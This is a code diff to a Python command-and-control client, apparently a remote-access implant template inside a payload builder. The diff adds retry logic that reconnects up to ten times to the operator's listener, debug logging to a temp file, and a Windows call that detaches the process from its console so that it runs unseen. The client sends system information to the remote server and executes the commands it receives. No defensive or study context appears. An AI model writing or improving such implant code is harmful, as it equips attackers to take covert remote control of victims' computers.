@@ -45,14 +45,29 @@ class C2Client:
         self.port = port
         self.socket = None
         self.running = True
+        self.debug_mode = False  # Set to True to enable debug logging
+        self.debug_file = os.path.join(os.getenv('TEMP', '/tmp'), 'c2_debug.log')
+    
+    def debug_log(self, msg):
+        """Write debug info to file"""
+        if self.debug_mode:
+            try:
+                with open(self.debug_file, 'a') as f:
+                    f.write(f"{{time.strftime('%H:%M:%S')}} - {{msg}}\\n")
+            except:
+                pass
     
     def connect(self):
         """Connect to C2 server"""
         try:
+            self.debug_log(f"Attempting connection to {{self.ip}}:{{self.port}}")
             self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            self.socket.settimeout(10)
             self.socket.connect((self.ip, self.port))
+            self.debug_log("Connection successful!")
             return True
-        except:
+        except Exception as e:
+            self.debug_log(f"Connection failed: {{str(e)}}")
             return False
     
     def send_json(self, data):
@@ -191,31 +206,46 @@ class C2Client:
         return {{'type': 'error', 'msg': 'Unknown command'}}
     
     def run(self):
-        """Main loop"""
-        if not self.connect():
-            return
+        """Main loop with retry logic"""
+        max_retries = 10
+        retry_delay = 5
         
-        try:
-            # Send initial info
-            self.send_json(self.get_system_info())
-            
-            # Command loop
-            while self.running:
-                cmd_data = self.recv_json()
-                if not cmd_data:
-                    break
+        for attempt in range(max_retries):
+            if self.connect():
+                try:
+                    # Send initial info
+                    self.send_json(self.get_system_info())
+                    
+                    # Command loop
+                    while self.running:
+                        cmd_data = self.recv_json()
+                        if not cmd_data:
+                            break
+                        
+                        response = self.handle_command(cmd_data)
+                        self.send_json(response)
+                except:
+                    pass
+                finally:
+                    try:
+                        self.socket.close()
+                    except:
+                        pass
                 
-                response = self.handle_command(cmd_data)
-                self.send_json(response)
-        except:
-            pass
-        finally:
-            try:
-                self.socket.close()
-            except:
-                pass
+                # If we get here, connection was lost, retry
+                if self.running:
+                    time.sleep(retry_delay)
+            else:
+                # Connection failed, wait and retry
+                time.sleep(retry_delay)
 
 if __name__ == '__main__':
+    # Detach from console on Windows
+    if sys.platform.startswith('win'):
+        import ctypes
+        kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
+        kernel32.FreeConsole()
+    
     client = C2Client('{self.listener_ip}', {self.listener_port})
     client.run()
 '''
